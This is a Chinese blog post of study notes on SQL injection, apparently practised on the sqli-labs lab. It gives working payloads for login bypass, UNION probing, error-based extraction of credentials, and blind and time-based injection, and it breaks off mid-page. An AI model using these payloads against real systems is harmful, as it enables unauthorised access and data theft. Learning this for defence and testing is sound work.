            "url": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
            "title": "SQL注入",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"什么是sql注入\"><a href=\"#什么是sql注入\" class=\"headerlink\" title=\"什么是sql注入\"></a>什么是sql注入</h2><p>学一个漏洞我们应该知道，漏洞的危害，成因、原理、攻击方式，以及防御方式。所以这里首先聊一聊什么是sql注入，SQL注入分类于web安全漏洞，通过sql注入攻击者可以干扰应用程序对其数据库进行查询。它通常允许攻击者查看他们正常无法检索到的数据。许多情况下攻击者可以对数据库进行增删改查的操作</p>\n<h2 id=\"sql注入的危害\"><a href=\"#sql注入的危害\" class=\"headerlink\" title=\"sql注入的危害\"></a>sql注入的危害</h2><p>前面说完了什么是sql注入，接下来我们聊一聊sql注入漏洞造成的危害，sql注入成功后我们不仅可以像上面提到是那样对各种数据进行增删改查，如果网站目录存在写入权限我们可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等，甚至可以通过提权等操作获取服务器最高权限来远程控制服务器，安装后门，修改或者控制操作系统</p>\n<h2 id=\"sql注入的成因\"><a href=\"#sql注入的成因\" class=\"headerlink\" title=\"sql注入的成因\"></a>sql注入的成因</h2><p>sql漏洞的成因很简单，就是开发过程没有对用户的输入进行严格的过滤，开发人员违背了“代码与数据分离”原则。一方面，攻击者可以任意更改输入数据；另一方面，攻击者可以在数据里构造代码，让服务器端把数据解析成代码执行。攻击者通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>\n<h2 id=\"SQL注入的分类\"><a href=\"#SQL注入的分类\" class=\"headerlink\" title=\"SQL注入的分类\"></a>SQL注入的分类</h2><h3 id=\"有回显的注入\"><a href=\"#有回显的注入\" class=\"headerlink\" title=\"有回显的注入\"></a>有回显的注入</h3><ol>\n<li>联合查询</li>\n<li>报错注入</li>\n<li>通过注入进行DNS请求，达到回显的目的</li>\n</ol>\n<h3 id=\"无回显的注入\"><a href=\"#无回显的注入\" class=\"headerlink\" title=\"无回显的注入\"></a>无回显的注入</h3><ol>\n<li>Bool盲注</li>\n<li>时间盲注</li>\n</ol>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><p>一种业务逻辑复杂的题目，一般需要自己编写脚本来实现自动化注入</p>\n<h2 id=\"where子句的sql注入漏洞\"><a href=\"#where子句的sql注入漏洞\" class=\"headerlink\" title=\"where子句的sql注入漏洞\"></a>where子句的sql注入漏洞</h2><p>本笔记基于sql-labs靶场记录</p>\n<p>sql-labs第一关</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>所有详细信息（*）</li>\n<li>从users表中</li>\n<li>其中类别是id</li>\n<li>limit 0,1表示的是从第一条记录开始，只取一条</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里会将sql查询的结果返回，这一关并没有进行任何的过滤，所以攻击者可以构建</p>\n<pre class=\"line-numbers language-payload\" data-language=\"payload\"><code class=\"language-payload\">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925110237019.png\" alt=\"image-20220925110237019\"></p>\n<p>这里的关键是两个减号在SQL中是注释指示符，意味着查询的其余部分被解释为注释。这将使得原有的语句后部分无法被包含，也就可以突破limit 0,1 的限制查询到所有的数据</p>\n<h3 id=\"颠覆应用逻辑\"><a href=\"#颠覆应用逻辑\" class=\"headerlink\" title=\"颠覆应用逻辑\"></a>颠覆应用逻辑</h3><p>sql-labs第11关</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='<span class=\"token interpolation\"><span class=\"token variable\">$uname</span></span>' and password='<span class=\"token interpolation\"><span class=\"token variable\">$passwd</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>一个登录页面，判断用户输入在数据库中能不能查询到，如果查询到则登录，查询不到这则拒绝，这里攻击者只需要使用SQL注释将密码的判断注释掉这可以直接用用户名登录<br>如这里有一个admin用户只需要在用户名处输入admin’#即可登录</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'admin'</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这时只判断了admin是否存在，但是这里还需要知道用户名，有没有一种方法不用用户名也能登录呢，有的</p>\n<p>我们使用上面有用到的or</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925113956855.png\" alt=\"image-20220925113956855\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里or是并运算，那么前后只需要成立一个便可<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925114457385.png\" alt=\"image-20220925114457385\"></p>\n<p>这里是可以执行成功的</p>\n<h2 id=\"联合查询的SQL注入\"><a href=\"#联合查询的SQL注入\" class=\"headerlink\" title=\"联合查询的SQL注入\"></a>联合查询的SQL注入</h2><p>当应用程序容易受到 SQL 注入的攻击，并且在应用程序的响应中返回查询结果时，可以使用关键字从数据库中的其他表中检索数据。这会导致 SQL 注入联合攻击。<em><strong>UNION</strong></em>该关键字允许您执行一个或多个附加查询，并将结果追加到原始查询</p>\n<p>使用UNION需要满足两个条件</p>\n<ol>\n<li>各个查询必须返回相同数量的列。</li>\n<li>每列中的数据类型必须在各个查询之间兼容。</li>\n</ol>\n<h3 id=\"确定SQL注入攻击中所需要的列数\"><a href=\"#确定SQL注入攻击中所需要的列数\" class=\"headerlink\" title=\"确定SQL注入攻击中所需要的列数\"></a>确定SQL注入攻击中所需要的列数</h3><p>有两个方法可以判断</p>\n<p>第一种方法涉及注入一系列子句并递增指定的列索引，直到发生错误</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' ORDER BY 1--\n'</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">2</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">3</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>第二种方法涉及提交一系列有效负载，指定不同数量的 值</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>上面都是当列数不匹配时会返回错误</p>\n<h3 id=\"查找具有有用数据类型的列\"><a href=\"#查找具有有用数据类型的列\" class=\"headerlink\" title=\"查找具有有用数据类型的列\"></a>查找具有有用数据类型的列</h3><p>要检索的相关数据将采用字符串形式，因此您需要在原始查询结果中查找数据类型为字符串数据或与字符串数据兼容的一列或多列。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT '</span>a<span class=\"token string\">',NULL,NULL,NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n<span class=\"token string\">' UNION SELECT NULL,NULL,'</span>a<span class=\"token string\">',NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><p>主要是三种报错注入的方式，分别是updatexml，floor和exp</p>\n<h3 id=\"updatexml\"><a href=\"#updatexml\" class=\"headerlink\" title=\"updatexml\"></a>updatexml</h3><p>原理从本质来说就是函数的报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001004112785.png\" alt=\"image-20221001004112785\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里的version替换成查询语句即可,下面是两个例子</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#\n&#39;) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"floor\"><a href=\"#floor\" class=\"headerlink\" title=\"floor\"></a>floor</h3><p><strong>关键函数：</strong><br><strong>Rand() ——-产生0~1的伪随机数</strong></p>\n<p><strong>rand有两种形式：</strong></p>\n<p><strong>1、rand(),即无参数的，此时产生的随机数是随机的，不可重复的；</strong></p>\n<p><strong>2、rand(n),即有参数数，如rand(0),这里0相当于种子，那么这里会产生一列伪随机数。</strong></p>\n<p><strong>Floor() ——-向下取整数</strong><br><strong>Concat() —–连接字符串</strong><br><strong>Count() ——计算总数</strong></p>\n<p><strong>1，count(*)</strong></p>\n<p><strong>返回表中的记录数(包括所有列)，相当于统计表的行数(不会忽略列值为NULL的记录)</strong></p>\n<p><strong>2，count(列名)</strong></p>\n<p><strong>返回列名指定列的记录数</strong></p>\n<p><strong>group by x  作用以x为主键分组</strong></p>\n<p><strong>主键，指的是一个列或多列的组合，其值能唯一地标识表中的每一行</strong></p>\n<p><strong>其实在做的时候分为两步首先扫描一行一行的扫描主键,如果虚拟表中有值则跳过，如果没有第二步将值放入虚表中</strong></p>\n<p>*<strong>首先rand()是随机生成一个0到1之间的随机数*</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003828506-513556717.png\" alt=\"img\"></strong></p>\n<p><strong>然后一般在floor中使用是会乘以2既floor(rand()*2),floor的作用是对数向下取整，则整个语句会形成一串伪随机011011….。</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003909146-1883988726.png\" alt=\"img\"></strong></p>\n<p><strong>count(*)的效果</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317005059387-2031388179.png\" alt=\"img\"></strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317004937232-708877907.png\" alt=\"img\"></strong></p>\n<p><strong>对于select floor(rand(0)*2),count(*) from users group by floor(rand(0)*2);报错</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131113712-1472090330.png\" alt=\"img\"></strong></p>\n<p><strong>过程解析</strong></p>\n<p><strong>1，group by时，会建立空虚拟表如下图，然后从sql语句执行结果序列（011011）读取数据并插入虚表:</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318130922453-1410766243.png\" alt=\"img\"></strong></p>\n<p> 2，虚表写入第一个数据(前一个floor部分进行一次计算，“第一次计算”）扫描主键，发现没有与0对应的主建，新建主键（这个主键的值是后面一个floor部分进行一次计算的值，“第二次计算”）如图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131856877-641578374.png\" alt=\"img\"></p>\n<p> 3，写入第二个数据（前一个floor部分计算的值，“第三次计算”）有对应的主键count（*）加一（这里就没有再计算后面的floor部分）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132321527-1779841079.png\" alt=\"img\"></p>\n<p> 4，写入第三个数据（前一个floor计算的值，“第四次计算”）扫描主键，发现没有与0对应的主建（刚刚建的主键记录的值实际为1），新建主键（这个主键的值是后面一个floor部分进行一次计算的值，“第五次计算”）新建的主键值又为1，因为主键不能重复，所以报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132958429-1301912811.png\" alt=\"img\"></p>\n<p>简单来说就是rand和group by的冲突</p>\n<p>接下来是例子</p>\n<p>‘) union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170034190-29499768.png\" alt=\"img\"></p>\n<p>‘) union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170056710-97820973.png\" alt=\"img\"></p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>exp()函数的报错原理是溢出报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001005353035.png\" alt=\"image-20221001005353035\"></p>\n<p>使用方法如上，这个地方并没有成功，暂不知是什么原因，有待解决</p>\n<h2 id=\"Bool盲注\"><a href=\"#Bool盲注\" class=\"headerlink\" title=\"Bool盲注\"></a>Bool盲注</h2><p>盲注一般使用在开发者将报错信息屏蔽时使用，虽然报错信息被屏蔽，但是页面会有不同的回显，常用的方式是在注入点后面加上and 1&#x3D;1或者and 1&#x3D;2，如果存在注入点那么and 1&#x3D;2的情况下，页面会有所不同，有些教程会把报错注入也归为盲注的一种，这里记录一下报错注入和盲注常用的函数</p>\n<h3 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h3><ol>\n<li><p>截取函数</p>\n<ul>\n<li><p>substr()</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">用法：substr(string string,num start,num length);\n\nselect  substr(参数1，参数2，参数3)  from  表名\n\nstring为字符串；start为起始位置；length为长度。\n\n注意：mysql中的start是从1开始的。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>left()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">LEFT(str,length);\nSQL\nLEFT()函数接受两个参数：\n\nstr是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。\nLEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>right()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【实例】使用 RIGHT 函数返回字符串中右边的字符，输入的 SQL 语句和执行结果如下所示。\nmysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);\n+------------------+\n| RIGHT(&#39;MySQL&#39;,3) |\n+------------------+\n| SQL              |\n+------------------+\n1 row in set (0.00 sec)\n由执行结果可知，函数返回字符串“MySQL”右边开始的长度为3的子字符串，结果为“SQL”。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n</li>\n<li><p>转换函数</p>\n<ul>\n<li><p>ascii()</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">返回字符串str的最左字符的数值。返回<span class=\"token number\">0</span>，如果str为空字符串。返回<span class=\"token boolean\">NULL</span>，如果str为<span class=\"token boolean\">NULL</span>。 ASCII<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>返回数值是从<span class=\"token number\">0</span>到<span class=\"token number\">255</span>。\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span>                                              <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">50</span>                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span>                                             <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">100</span>                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>hex()</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">如果N_or_S是一个数字，返回N，其中N是一个长长<span class=\"token punctuation\">(</span><span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">)</span>数字的十六进制值的字符串表示。这等同于CONV<span class=\"token punctuation\">(</span>N，<span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>。\n\n\t如果N_or_S是一个字符串，返回N_or_S在N_or_S每个字符被转化为两个十六进制数字的十六进制字符串表示。\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> FF                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">0x616263</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">0x616263</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> abc                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n</li>\n<li><p>比较函数</p>\n<ul>\n<li><p>if()</p>\n<p><strong>语法结构：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">if(expr1,expr2,expr3)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上述语法结构中expr1表示的是判断条件，expr2和expr3是符合expr1的自定义的返回结果</p>\n<p>当expr1的值为真时，则返回值为expr2；当expr1的值为假时，则返回值为expr3</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h2><p>时间盲注出现的原因也是因为服务器端拼接了失去了语句但是所有的回显都被过滤，我们只能通过页面的响应时间做一个判断但是由于sleep和benchmark函数的大量执行会使得服务器的负载高，容易导致题目挂掉。</p>\n<p>做题的方法和bool盲注差不多，判断的方式不同，一般时间盲注常用的有两个函数sleep和benchmark函数如下表</p>\n<table>\n<thead>\n<tr>\n<th>函数名</th>\n<th>功能和使用方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sleep()</td>\n<td>sleep是睡眠函数，可以使得查询数据的时候回显数据的响应时间延长，使用方法sleep(N)这里N是延长的时间，常配合if使用：<br />if(ascll(subster(user(),1,1))&#x3D;114,sleep(5),2)<br />这样绕过user的第一位的ascll为114则页面返回时间延迟5秒</td>\n</tr>\n<tr>\n<td>benchmark()</td>\n<td>benchmark函数原本是用来重复执行某条语句的函数，我们可以利用这个函数来测试数据库的读写性能使用方法：<br />benchmark(N，expression)<br />其中N为执行次数，expression为表达式。如果需要进行盲注，我们通常遇需要运算时间的计算配合使用比如MD5</td>\n</tr>\n</tbody></table>\n<h2 id=\"二次注入-1\"><a href=\"#二次注入-1\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>二次注入的成因是第一次入库时经过了一些转义，但是存入数据库后会去除转义，导致第二次使用时恶意构造sql语句</p>\n<h2 id=\"limit之后的注入\"><a href=\"#limit之后的注入\" class=\"headerlink\" title=\"limit之后的注入\"></a>limit之后的注入</h2><p>mysql数据库&gt;5.0、mysql数据库&lt;5.6.6可以在limit部分进行注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select field from table where id &gt; 0 order by id limit &#123;injection_point&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>也可以使用如下的payload进行注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select firld from user where id &gt; 0 order by id limit 1,1 procedure analyse(extractractvalue(rand(),concat(0x3a,version())),1);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"注入点的发现\"><a href=\"#注入点的发现\" class=\"headerlink\" title=\"注入点的发现\"></a>注入点的发现</h2><h3 id=\"常见的注入点\"><a href=\"#常见的注入点\" class=\"headerlink\" title=\"常见的注入点\"></a>常见的注入点</h3><ol>\n<li>GET参数</li>\n<li>POST参数</li>\n<li>UA头</li>\n<li>Cookie</li>\n</ol>\n<h3 id=\"判断注入点存在\"><a href=\"#判断注入点存在\" class=\"headerlink\" 